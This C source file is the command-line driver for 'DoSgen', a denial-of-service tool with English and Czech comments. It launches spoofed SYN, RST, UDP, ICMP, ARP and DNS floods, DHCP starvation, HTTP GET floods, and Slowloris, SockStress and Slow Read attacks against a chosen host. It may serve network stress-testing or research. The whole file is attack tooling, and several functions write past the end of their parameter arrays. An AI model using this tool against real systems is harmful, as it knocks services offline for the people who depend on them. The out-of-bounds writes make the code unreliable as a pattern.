#include <stdio.h>
#include <getopt.h>
#include <string.h>
#include <stdlib.h>
#include <stdbool.h>
#include <unistd.h> //sleep

#include "libdos.h"
//#include "tcpgen/tcpgenlib.h"

void print_help_and_die()
{
    printf("\n/-----------------DoSgen usage-----------------/\n"
           "\n  General options:\n"
           "\t-i:\t interface (e.g. eth0)\n"
           "\t-P:\t number of processes (only in case of attack without handshake)\n\n"
           "  Attacks without handshake:\n"
           "\t--syn:\t\t SYN flood\n"
           "\t--rst:\t\t RST flood\n"
           "\t--udp:\t\t UDP flood\n"
           "\t--icmp:\t\t ICMP flood\n"
           "\t--arp:\t\t ARP flood\n"
           "\t--dns:\t\t DNS flood\n"
           "\t--dhcp:\t\t DHCP starvation\n"
           "\n  Definitions:\n"
           "\t-s:\t source IP address\n"
           "\t-d:\t destination IP address\n"
           "\t-S:\t source port\n"
           "\t-D:\t destination port\n"
           "\t-n:\t DNS name\n"
           "\t-p:\t payload length\n"
           "\t-h:\t help, shows this message\n\n"
           "  Usage: ./dosgen -i <iface> [-P] <attack_type> -d <dest ip> [-s <source ip> -S <source port> -D <dest port> -p <payload len>] -n <DNS name> (in case of --dns attack)\n" 
           "\n/----------------------------------------------/\n"
           "\n  Attacks with handshake:\n"
		   "\t--http:\t\t HTTP GET flood\n"
		   "\t--sockstress:\t SockStress attack\n"
		   "\t--slowloris:\t Slow Loris attack\n"
		   "\t--slowread:\t Slow Read attack\n"
           "\n  Definitions:\n"
		   "\t-H:\t Host name\n"
		   "\t-U:\t URI\n"
		   "\t-C:\t Number of connections\n\n"
           "  Usage: ./dosgen -i <iface> <attack_type> -H <host name | IP> -U <URI> -C <num of connections>\n\n"); 
    exit(100);
}

void str_replace(char s[], char chr, char repl_chr)
{
	//chr - char you want to replace with repl_chr/chr - char ktery chceme nahradit charem repl_chr
    int i=0;
	//search until you get to the end of string/hledej dokud nenarazis na konec stringu
    while(s[i]!='\0')
    {
        if(s[i]==chr)
        {
            s[i]=repl_chr;
        }
        i++;
    }
}

//-----------SYN flood-----------//
void syn_flood(int argc, char **argv)
{
    int payload_len = 0;
    char *src_ip = "drnd(4)";
    char *dst_ip = NULL;
    char *src_port = "rand";
    char *dst_port = "rand";
    char src_port_buffer[100];
    char dst_port_buffer[100];

    int c;
    opterr = 0;
    	
	// getopt() checks if following options were specified, ':' means that argument should follow options dsDSp
    // getopt() kontroluje zda byly specifikovany moznosti, ':' znamena, ze moznosti dsDSp by mel nasledovat nejaky argument
	while ((c = getopt(argc, argv, "d:s:D:S:p:h")) != -1)
    {
        switch (c)
        {
        case 'd':
            dst_ip = optarg;
            // Changing "." to "," in typing in IP address - necessary for trafgen
            // Zmena "." za "," pri zadavani IP adresy, nutne pro Trafgen
            str_replace(dst_ip, '.', ',');
            break;
        case 's':
            src_ip = optarg;
            str_replace(src_ip, '.', ',');
            break;
        case 'D':
            dst_port = optarg;
            break;
        case 'S':
            src_port = optarg;
            break;
        case 'p':
            payload_len = atoi(optarg);
            break;
        case 'h':
            print_help_and_die();
            break;
        default:
			// If there was none of the above options specified, write to standard error output and call help function
            // Pokud nebyla specifikovana zadna z dostupnych moznosti, zapis do standartniho chyboveho vystupu a volej funkci pro napovedu
			fprintf(stderr, "\n[-%c] is not a valid argument!\n\n", optopt);
            print_help_and_die();
        }
    }

// Generating unspecified options/Nahodne generovani nespecifikovanych moznosti
    if (dst_ip)
    {
        if (strcmp(src_ip, "rand") == 0)
        {
            src_ip = "drnd(4)";
        }
        if (strcmp(dst_ip, "rand") == 0)
        {
            dst_ip = "drnd(4)";
        }
        if (strcmp(src_port, "rand") == 0)
        {
            src_port = "drnd(2)";
        }
        else
        {
            //atoi function needed for converting optarg src_port from char to int
            //atoi funkce nutna pro prevod src_port ze retezce na integer
            sprintf(src_port_buffer, "const16(%d)", atoi(src_port));
            src_port = src_port_buffer;
        }
        if (strcmp(dst_port, "rand") == 0)
        {
            dst_port = "drnd(2)";
        }
        else
        {
            sprintf(dst_port_buffer, "const16(%d)", atoi(dst_port));
            dst_port = dst_port_buffer;
        }
        // Creating the configuration packet for trafgen
        // Vytvoreni konfigurace paketu pro trafgen
        char *err = prepare_syn(src_ip, src_port, dst_ip, dst_port, payload_len);
        if (err != NULL)
        {
            printf("ERROR: %s\n", err);
        }
    }
    else
    {
        printf("\nRequired argument dst_ip is missing\n\n");
        print_help_and_die();
    }
}

//-----------RST flood-----------//
void rst_flood(int argc, char **argv)
{
    int payload_len = 0;
    char *src_ip = "drnd(4)";
    char *dst_ip = NULL;
    char *src_port = "rand";
    char *dst_port = "rand";
    char src_port_buffer[100];
    char dst_port_buffer[100];

    int c;
    opterr = 0;
    while ((c = getopt(argc, argv, "d:s:D:S:p:h")) != -1)
    {
        switch (c)
        {
        case 'd':
            dst_ip = optarg;
            str_replace(dst_ip, '.', ',');
            break;
        case 's':
            src_ip = optarg;
            str_replace(src_ip, '.', ',');
            break;
        case 'D':
            dst_port = optarg;
            break;
        case 'S':
            src_port = optarg;
            break;
        case 'p':
            payload_len = atoi(optarg);
            break;
        case 'h':
            print_help_and_die();
            break;
        default:
            print_help_and_die();
        }
    }

// Generating unspecified options
// Nahodne generovani nespecifikovanych moznosti
    if (dst_ip)
    {
        if (strcmp(src_ip, "rand") == 0)
        {
            src_ip = "drnd(4)";
        }
        if (strcmp(dst_ip, "rand") == 0)
        {
            dst_ip = "drnd(4)";
        }
        if (strcmp(src_port, "rand") == 0)
        {
            src_port = "drnd(2)";
        }
        else
        {
            sprintf(src_port_buffer, "const16(%d)", atoi(src_port));
            src_port = src_port_buffer;
        }

        if (strcmp(dst_port, "rand") == 0)
        {
            dst_port = "drnd(2)";
        }
        else
        {
            sprintf(dst_port_buffer, "const16(%d)", atoi(dst_port));
            dst_port = dst_port_buffer;
        }

        char *err = prepare_rst(src_ip, src_port, dst_ip, dst_port, payload_len);
        if (err != NULL)
        {
            printf("ERROR: %s\n", err);
        }
    }
    else
    {
        printf("\nRequired argument missing\n");
        print_help_and_die();
    }

}

//-----------UDP flood-----------//
void udp_flood(int argc, char **argv)
{
    int payload_len = 0;
    char *src_ip = "drnd(4)";
    char *dst_ip = NULL;
    char src_port_buffer[100];
    char dst_port_buffer[100];
    char *src_port = "rand";
    char *dst_port = "rand";

    int c;
    opterr = 0;
    while ((c = getopt(argc, argv, "d:s:D:S:p:h")) != -1)
    {
        switch (c)
        {
        case 'd':
            dst_ip = optarg;
            str_replace(dst_ip, '.', ',');
            break;
        case 's':
            src_ip = optarg;
            str_replace(src_ip, '.', ',');
            break;
        case 'D':
            dst_port = optarg;
            break;
        case 'S':
            src_port = optarg;
            break;
        case 'p':
            payload_len = atoi(optarg);
            break;
        case 'h':
            print_help_and_die();
            break;
        default:
            print_help_and_die();
        }
    }

    if (dst_ip)
    {
        if (strcmp(src_ip, "rand") == 0)
        {
            src_ip = "drnd(4)";
        }
        if (strcmp(dst_ip, "rand") == 0)
        {
            dst_ip = "drnd(4)";
        }


        if (strcmp(src_port, "rand") == 0)
        {
            src_port = "drnd(2)";
        }
        else
        {
            sprintf(src_port_buffer, "const16(%d)", atoi(src_port));
            src_port = src_port_buffer;
        }

        if (strcmp(dst_port, "rand") == 0)
        {
            dst_port = "drnd(2)";
        }
        else
        {
            sprintf(dst_port_buffer, "const16(%d)", atoi(dst_port));
            dst_port = dst_port_buffer;
        }

        char *err = prepare_udp(src_ip, src_port, dst_ip, dst_port, payload_len);
        if (err != NULL)
        {
            printf("ERROR: %s\n", err);
        }
    }
    else
    {
        printf("\nRequired argument missing\n");
        print_help_and_die();
    }
}

//-----------ICMP flood-----------//
void icmp_flood(int argc, char **argv)
{
    int payload_len = 0;
    char *src_ip = "drnd(4)";
    char *dst_ip = NULL;

    int c;
    opterr = 0;
    while ((c = getopt(argc, argv, "d:s:p:h")) != -1)
    {
        switch (c)
        {
        case 'd':
            dst_ip = optarg;
            str_replace(dst_ip, '.', ',');
            break;
        case 's':
            src_ip = optarg;
            str_replace(src_ip, '.', ',');
            break;
        case 'p':
            payload_len = atoi(optarg);
            break;
        case 'h':
            print_help_and_die();
            break;
        default:
            print_help_and_die();
        }
    }

    if (dst_ip)
    {
        if (strcmp(src_ip, "rand") == 0)
        {
            src_ip = "drnd(4)";
        }
        if (strcmp(dst_ip, "rand") == 0)
        {
            dst_ip = "drnd(4)";
        }

        char *err = prepare_icmp(src_ip, dst_ip, payload_len);
        if (err != NULL)
        {
            printf("ERROR: %s\n", err);
        }
    }
    else
    {
        printf("\nRequired argument missing\n");
        print_help_and_die();
    }
}

//-----------ARP flood-----------//
void arp_flood(int argc, char **argv)
{
    int payload_len = 0;
    char *src_ip = "drnd(4)";
    char *dst_ip = NULL;

    int c;
    opterr = 0;
    while ((c = getopt(argc, argv, "s:d:p:h")) != -1)
    {
        switch (c)
        {
        case 's':
            src_ip = optarg;
            str_replace(src_ip, '.', ',');
            break;
        case 'd':
            dst_ip = optarg;
            str_replace(dst_ip, '.', ',');
            break;

        case 'p':
            payload_len = atoi(optarg);
            break;
        case 'h':
            print_help_and_die();
            break;
        default:
            print_help_and_die();
        }
    }

    if (dst_ip)
    {
        if (strcmp(src_ip, "rand") == 0)
        {
            src_ip = "drnd(4)";
        }

        if (strcmp(dst_ip, "rand") == 0)
        {
            dst_ip = "drnd(4)";
        }

        char *err = prepare_arp(src_ip, dst_ip, payload_len);
        if (err != NULL)
        {
            printf("ERROR: %s\n", err);
        }
    }
    else
    {
        printf("\nRequired argument missing\n");
        print_help_and_die();
    }
}

//-----------DNS flood-----------//
void dns_flood(int argc, char **argv)
{
    int payload_len = 0;
    char *dst_ip = NULL;
    char *src_ip = "drnd(4)";
    char src_port_buffer[100];
    char *src_port = "rand";
    char *dns_name = NULL;

    int c;
    opterr = 0;
    while ((c = getopt(argc, argv, "s:S:d:p:n:h")) != -1)
    {
        switch (c)
        {
        case 'd':
            dst_ip = optarg;
            str_replace(dst_ip, '.', ',');
            break;
        case 's':
            src_ip = optarg;
            str_replace(src_ip, '.', ',');
            break;
        case 'S':
            src_port = optarg;
            break;
        case 'p':
            payload_len = atoi(optarg);
            break;
        case 'n':
            dns_name = optarg;
            break;
        case 'h':
            print_help_and_die();
            break;
        default:
            print_help_and_die();
        }
    }
    if (dst_ip && dns_name)
    {
        if (strcmp(src_ip, "rand") == 0)
        {
            src_ip = "drnd(4)";
        }
        if (strcmp(dst_ip, "rand") == 0)
        {
            dst_ip = "drnd(4)";
        }
        if (strcmp(src_port, "rand") == 0)
        {
            src_port = "drnd(2)";
        }
        else
        {
            sprintf(src_port_buffer, "const16(%d)", atoi(src_port));
            src_port = src_port_buffer;
        }

        char *err = prepare_dns(src_ip, src_port, dst_ip, payload_len, dns_name);
        if (err != NULL)
        {
            printf("ERROR: %s\n", err);
        }
    }
    else
    {
        printf("\nRequired argument missing\n");
        print_help_and_die();
    }
}

//-----------DHCP starvation-----------//
void dhcp_flood(int argc, char **argv)
{
    int payload_len = 0;
    int c;
    opterr = 0;

    while ((c = getopt(argc, argv, "p:h")) != -1)
    {
        switch (c)
        {
        case 'p':
            payload_len = atoi(optarg);
            break;
        case 'h':
            print_help_and_die();
            break;
        default:
            print_help_and_die();
        }
    }

    char *err = prepare_dhcp(payload_len);

    if (err != NULL)
    {
        printf("ERROR: %s\n", err);
    }
}

//-------------------HTTP GET flood---------------------//
void http_get_flood(int argc, char **argv, char *dev)
{
	char *host_name = NULL;
	char *URI = NULL;
    char *connections = NULL;
	int c;
    
    //Input arguments check
    //Osetreni vstupnich argumentu
    if(argc < 5)
    {
        printf("\nNot enough arguments passed to --http\n");
        print_help_and_die();
        exit(-1);
    }

	while((c = getopt(argc, argv, "H:U:C:")) != -1)
	{
		switch(c)
		{
		case 'H':
            host_name = optarg;
			break;
		case 'U':
			URI = optarg;
			break;
        case 'C':
			connections = optarg;
			break;
        case ':':
		    printf("\nBad option!\n");
            print_help_and_die();
        case '?':
            printf("\nWrong argument specified!\n");
            print_help_and_die();
		default:
			printf("Wrong arguments!\n");
            print_help_and_die();
		}
	}
    //Filling char pointer array which will then be passed to tcp_gen function from libtcpgen
    //Naplneni char pole pointeru, ktere je pak predano funkci tcp_gen z knihovny libtcpgen
    char *params[4];
    params[0] = "http";
    params[1] = host_name;
    params[2] = URI;
    params[3] = dev;
    params[4] = connections;

    argc = 5;    
    tcp_gen(argc, params);

}
//-------------------Slow Loris---------------------//
void slow_loris(int argc, char **argv, char *dev)
{
	char *host_name = NULL;
	char *URI = NULL;
    char *connections = NULL;
	int c;

    //Slow loris function is handled similarly to http_get_flood
    //Slow loris funkce je podobne resena jako http_get_flood
    if(argc < 5)
    {
        printf("\nNot enough arguments passed to --slowloris\n");
        print_help_and_die();
        exit(-1);
    }

	while((c = getopt(argc, argv, "H:U:C:")) != -1)
	{
		switch(c)
		{
		case 'H':
            host_name = optarg;
			break;
		case 'U':
			URI = optarg;
            break;
        case 'C':
			connections = optarg;
			break;
        case '?':
            printf("\nWrong argument specified!\n");
            print_help_and_die();
		default:
			printf("\nWrong arguments!\n");
            print_help_and_die();
		}
	}
    char *params[3];
    params[0] = "slowloris";
    params[1] = host_name;
    params[2] = URI;
    params[3] = dev;
    params[4] = connections;

    argc = 5;    
    tcp_gen(argc, params);

}

void sock_stress(int argc, char **argv, char *dev)
{
	char *host_name = NULL;
	char *URI = NULL;
    char *connections = NULL;
	int c;

    //Sock stress function is handled similarly to http_get_flood
    //Sock stress funkce je podobne resena jako http_get_flood
    if(argc < 5)
    {
        printf("\nNot enough arguments passed to --sockstress\n");
        print_help_and_die();
        exit(-1);
    }

	while((c = getopt(argc, argv, "H:U:C:")) != -1)
	{
		switch(c)
		{
		case 'H':
            host_name = optarg;
			break;
		case 'U':
			URI = optarg;
            break;
        case 'C':
			connections = optarg;
			break;
        case '?':
            printf("\nWrong argument specified!\n");
            print_help_and_die();
		default:
			printf("\nWrong arguments!\n");
            print_help_and_die();
		}
	}
    char *params[3];
    params[0] = "sockstress";
    params[1] = host_name;
    params[2] = URI;
    params[3] = dev;
    params[4] = connections;

    argc = 5;    
    tcp_gen(argc, params);

}

void slow_read(int argc, char **argv, char *dev)
{
	char *host_name = NULL;
	char *URI = NULL;
    char *connections = NULL;
	int c;

    //Slow read function is handled similarly to http_get_flood
    //Slow read funkce je podobne resena jako http_get_flood
    if(argc < 5)
    {
        printf("\nNot enough arguments passed to --slowread\n");
        print_help_and_die();
        exit(-1);
    }

	while((c = getopt(argc, argv, "H:U:C:")) != -1)
	{
		switch(c)
		{
		case 'H':
            host_name = optarg;
			break;
		case 'U':
			URI = optarg;
            break;
        case 'C':
			connections = optarg;
			break;
        case '?':
            printf("\nWrong argument specified!\n");
            print_help_and_die();
		default:
			printf("\nWrong arguments!\n");
            print_help_and_die();
		}
	}
    char *params[3];
    params[0] = "slowread";
    params[1] = host_name;
    params[2] = URI;
    params[3] = dev;
    params[4] = connections;

    argc = 5;    
    tcp_gen(argc, params);

}

//Function finds '--' string which sets type of the attack and counts parameters
//Funkce hleda '--' string ktery znaci typ utoku a spocita parametry
bool find_flood(int argc, char **argv, int *flood_type_index, int *flood_argc)
{
    while (1)
    {
        if (*flood_type_index >= argc)
        {
            return false;
        }
        else if (strncmp(argv[*flood_type_index], "--", 2) == 0)
        {
            break;
        }
        (*flood_type_index)++;
    }
    *flood_argc = 0;
    while (1)
    {
		int flood_arg_index = *flood_type_index + 1 + *flood_argc;
        if ((flood_arg_index >= argc) ||
                (strncmp(argv[flood_arg_index], "--", 2) == 0))
        {
            break;
        }
        (*flood_argc)++;
    }
    return true;
}

//Main function of a program
//Hlavni funkce programu
int main(int argc, char **argv)
{
	if (argc < 4) {
		printf("\nNot specified enough arguments!\n -- Run again! --\n\n");
		print_help_and_die();
	}

    int argc_orig = argc;
    int i = 0;
    while (1)
    {
        if (i >= argc)
        {
            break;
        }
        //Find point where --<name of the attack> begins and later pass it to find flood function
        //Hleda misto kde zacina string --, znacici nazev utoku, index pak preda funkci find flood
        else if (strncmp(argv[i], "--", 2) == 0)
        {
            break;
        }
        //Increase i as long as strncmp at i position is not equal to --
        //Zvysi i dokud strncmp na pozici i neni rovna --
        i++;
    }
    argc = i;

    int proc_num = 0;
    char *dev = NULL;

    int c;
    opterr = 0;
    while ((c = getopt(argc, argv, "i:P:h")) != -1) // b:
    {
        switch (c)
        {
        case 'i':
            dev = optarg;
            break;
        case 'P':
            proc_num = atoi(optarg);
            break;
        /*case 'b':
                pps = atoi(optarg);
                break;*/
        case 'h':
            print_help_and_die();
            break;
        default:
            print_help_and_die();
        }
    }
    //Num of cpu cores to run on
    //Pocet cpu jader na kterych ma program bezet
    char proc_num_str[10];
    sprintf(proc_num_str, "%u", proc_num);
    /*char pps_str[10];
    sprintf(pps_str, "%u", pps);*/

    // Checking if file exists and deleting it
    // Zjisteni jestli soubor existuje a jeho vymazani
    if(access("tmp.cfg", F_OK) != -1){
        if(remove("tmp.cfg") != 0)
            perror("\ntmp.cfg not deleted!\n");
    }
    
    argc = argc_orig;
    argv++;
    argc--;
    //If set to true, tcpgen function will be used, otherwise trafgen will be used
    //Pokud bude nastaveno na true, tcpgen funkce bude volana, jinak je zavolan trafgen
    bool tcp_attack = false;

    int flood_type_index = 0;
    int flood_argc = 0;
    while (find_flood(argc, argv, &flood_type_index, &flood_argc))
    {
        optind = 0;
        opterr = 0;
        optopt = 0;
        
		char *flood_type = argv[flood_type_index];
        char **flood_argv = argv + flood_type_index;

        // SYN flood
        if (strcmp(flood_type, "--syn") == 0)
        {
            syn_flood(flood_argc + 1, flood_argv);
        }
        // RST flood
        else if (strcmp(flood_type, "--rst") == 0)
        {
            rst_flood(flood_argc + 1, flood_argv);
        }
        // UDP flood
        else if (strcmp(flood_type, "--udp") == 0)
        {
            udp_flood(flood_argc + 1, flood_argv);
        }
        // ICMP flood
        else if (strcmp(flood_type, "--icmp") == 0)
        {
            icmp_flood(flood_argc + 1, flood_argv);
        }
        // ARP flood
        else if (strcmp(flood_type, "--arp") == 0)
        {
            arp_flood(flood_argc + 1, flood_argv);
        }
        // DNS flood
        else if (strcmp(flood_type, "--dns") == 0)
        {
            dns_flood(flood_argc + 1, flood_argv);
        }
        // DHCP starvation
        else if (strcmp(flood_type, "--dhcp") == 0)
        {
            dhcp_flood(flood_argc + 1, flood_argv);
        }
        // For following attacks device needs to be passed
        // Pro tyto utoky je nutne predat i nazev zarizeni (eth0, wlan...)
        else if (strcmp(flood_type, "--http") == 0)
        {
            tcp_attack = true;
            http_get_flood(flood_argc + 1, flood_argv, dev);
        }
        else if (strcmp(flood_type, "--sockstress") == 0)
        {
            tcp_attack = true;
            sock_stress(flood_argc + 1, flood_argv, dev);
        }
        else if (strcmp(flood_type, "--slowloris") == 0)
        {
            tcp_attack = true;
            slow_loris(flood_argc + 1, flood_argv, dev);
        }
        else if (strcmp(flood_type, "--slowread") == 0)
        {
            tcp_attack = true;
            slow_read(flood_argc + 1, flood_argv, dev);
        }
	else
        {
            print_help_and_die();
        }
        if (flood_argc > 0)
        {
            flood_type_index += flood_argc;
        }
        else
        {
            flood_type_index += 1;
        }
    }

// Starting the atack
// Zahajeni utoku
    if(tcp_attack == false)
        start_attack(dev, proc_num_str); //pps_str

    return 0;
}

